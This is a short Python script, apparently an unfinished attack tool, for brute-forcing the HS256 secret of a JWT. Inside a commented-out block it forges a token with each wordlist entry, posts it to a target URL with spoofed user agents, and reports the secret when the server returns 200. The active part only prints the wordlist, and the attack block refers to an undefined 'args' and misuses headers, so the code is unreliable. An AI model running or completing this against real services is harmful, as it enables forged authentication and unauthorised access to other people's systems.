#!/usr/bin/python3
# -*- coding: utf-8 -*-
import sys, requests, jwt

if len(sys.argv) != 2:
	print ('Use ',sys.argv[0], '<wordlist.txt>')
	sys.exit(0)

#url = input('URL: ')
#referer = input('Referer(Header): ')
wordlist = []
wordlist = open(sys.argv[1]).read().split('\n')

user_agents = open('user_agents.txt')
user_agents = user_agents.read().split('\n')

print(wordlist)
for secret in wordlist:
    print(secret)

'''
    encoded = jwt.encode({"bla" : "blabla"}, '{s}'.format(s=secret), algorithm='HS256')
    req = str(encoded)
    tkn = "Bearer {t}".format(t=req[2:-1])

    burp0_url = args.url
    burp0_headers = {"User-Agent": "", "Accept": "application/json", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": "", "authorization": ""}
    burp0_headers['authorization'] = tkn
    burp0_headers['Referer'] = args.referer
    burp0_headers['User-Agent'] = user_agents

    r = requests.post(burp0_url, headers=burp0_headers)
    print('{s} > {r}'.format(s=secret,r=r.status_code))
    if r.status_code == 200:
        print('\nSECRET FOUND')
        print('')
        print('Token JWT: {t}'.format(t=tkn))
        exit(0)

print('Secret NOT FOUND!')
'''
